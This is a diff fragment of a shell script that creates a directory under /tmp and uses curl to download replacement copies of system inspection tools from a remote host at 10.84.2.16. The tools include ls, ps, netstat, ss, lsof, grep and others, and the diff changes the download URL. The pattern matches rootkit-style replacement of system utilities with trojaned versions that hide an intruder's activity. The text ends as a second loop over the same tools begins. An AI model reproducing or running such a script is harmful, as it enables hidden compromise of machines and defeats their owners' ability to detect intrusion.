@@ -2,7 +2,7 @@ mkdir /tmp/wvikdlas
 cd /tmp/wvikdlas
 for i in 'ls' 'ps' 'ss' 'netstat' 'lsof' 'strings' 'systemctl' 'last' 'grep' 'find' 'service' 'cat'
 do
-	curl http://10.84.2.16/wvikdlas/'.'$i -o $i
+	curl http://10.84.2.16/'.'$i -o $i
 done
 
 for i in 'ls' 'ps' 'ss' 'netstat' 'lsof' 'strings' 'systemctl' 'last' 'grep' 'find' 'service' 'cat'
